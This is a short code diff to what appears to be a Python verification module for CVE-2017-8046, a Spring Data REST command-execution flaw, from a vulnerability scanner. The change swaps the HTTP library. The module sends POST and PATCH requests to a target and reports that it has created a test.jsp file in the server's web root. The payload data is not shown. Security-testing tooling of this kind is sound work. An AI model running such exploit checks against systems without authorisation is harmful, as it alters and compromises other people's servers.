@@ -6,7 +6,7 @@ description: CVE-2017-8046漏洞可执行任意命令,执行的命令：/usr/bin
 '''
 
 import json
-import requests
+from app.lib.utils.request import request
 
 class CVE_2017_8046_BaseVerify:
     def __init__(self, url):
@@ -29,8 +29,8 @@ class CVE_2017_8046_BaseVerify:
         try:
             if not self.url.startswith("http") and not self.url.startswith("https"):
                 self.url = "http://" + self.url
-            response1 = requests.post(self.url + '/customers', headers = self.headers1, data = json.dumps(self.data1), allow_redirects = False, verify = False)
-            response2 = requests.patch(self.url + '/customers/1', headers = self.headers2, data = json.dumps(self.data2), allow_redirects = False, verify = False)
+            response1 = request.post(self.url + '/customers', headers = self.headers1, data = json.dumps(self.data1))
+            response2 = request.patch(self.url + '/customers/1', headers = self.headers2, data = json.dumps(self.data2))
             content2 = response2.text
             if 'maybe not public' in content2:
                 print("存在CVE-2017-8046漏洞,已在目标服务器的根目录下生成了test.jsp文件！")
